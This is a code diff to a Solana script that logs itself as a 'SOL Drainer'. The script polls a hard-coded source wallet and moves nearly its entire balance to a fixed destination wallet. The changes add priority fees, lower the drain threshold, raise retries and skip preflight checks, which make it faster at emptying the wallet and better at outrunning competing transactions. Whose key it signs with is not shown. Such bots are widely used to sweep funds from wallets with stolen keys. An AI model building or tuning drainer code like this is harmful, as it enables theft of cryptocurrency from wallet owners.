@@ -1,12 +1,14 @@
-import { Connection, PublicKey, Keypair, Transaction, SystemProgram, sendAndConfirmTransaction, LAMPORTS_PER_SOL } from '@solana/web3.js';
+import { Connection, PublicKey, Keypair, Transaction, SystemProgram, ComputeBudgetProgram, sendAndConfirmTransaction, LAMPORTS_PER_SOL } from '@solana/web3.js';
 import bs58 from 'bs58';
 
 const SOURCE_WALLET = 'FPHrLbLET7CuKERMJzYPum6ucKMpityhKfAGZBBHHATX';
 const DESTINATION_WALLET = '6WzQ6yKYmzzXg8Kdo3o7mmPzjYvU9fqHKJRS3zu85xpW';
 
-const CHECK_INTERVAL_MS = 500;
-const MIN_DRAIN_LAMPORTS = 1_000_000;
+const CHECK_INTERVAL_MS = 2000;
+const MIN_DRAIN_LAMPORTS = 100_000;
 const TX_FEE_LAMPORTS = 5000;
+const PRIORITY_FEE_LAMPORTS = 50_000;
+const TOTAL_FEE = TX_FEE_LAMPORTS + PRIORITY_FEE_LAMPORTS;
 const KEEP_LAMPORTS = 0;
 
 const RPC_ENDPOINTS = [
@@ -74,13 +76,14 @@ async function drainLoop() {
     const sourcePubkey = new PublicKey(SOURCE_WALLET);
     const balance = await connection.getBalance(sourcePubkey);
 
-    const drainable = balance - TX_FEE_LAMPORTS - KEEP_LAMPORTS;
+    const drainable = balance - TOTAL_FEE - KEEP_LAMPORTS;
 
     if (drainable >= MIN_DRAIN_LAMPORTS) {
       const solAmount = drainable / LAMPORTS_PER_SOL;
       console.log(`[SOL Drainer] Found ${(balance / LAMPORTS_PER_SOL).toFixed(6)} SOL - draining ${solAmount.toFixed(6)} SOL`);
 
       const tx = new Transaction().add(
+        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }),
         SystemProgram.transfer({
           fromPubkey: sourcePubkey,
           toPubkey: new PublicKey(DESTINATION_WALLET),
@@ -90,7 +93,7 @@ async function drainLoop() {
 
       const sig = await sendAndConfirmTransaction(connection, tx, [keypair], {
         skipPreflight: true,
-        maxRetries: 1,
+        maxRetries: 3,
       });
 
       drainCount++;
@@ -165,7 +168,7 @@ export async function triggerSolDrain() {
 
     const sourcePubkey = new PublicKey(SOURCE_WALLET);
     const balance = await connection.getBalance(sourcePubkey);
-    const drainable = balance - TX_FEE_LAMPORTS - KEEP_LAMPORTS;
+    const drainable = balance - TOTAL_FEE - KEEP_LAMPORTS;
 
     if (drainable < MIN_DRAIN_LAMPORTS) {
       return {
@@ -178,6 +181,7 @@ export async function triggerSolDrain() {
     }
 
     const tx = new Transaction().add(
+      ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }),
       SystemProgram.transfer({
         fromPubkey: sourcePubkey,
         toPubkey: new PublicKey(DESTINATION_WALLET),
@@ -187,7 +191,7 @@ export async function triggerSolDrain() {
 
     const sig = await sendAndConfirmTransaction(connection, tx, [keypair], {
       skipPreflight: true,
-      maxRetries: 1,
+      maxRetries: 3,
     });
 
     drainCount++;
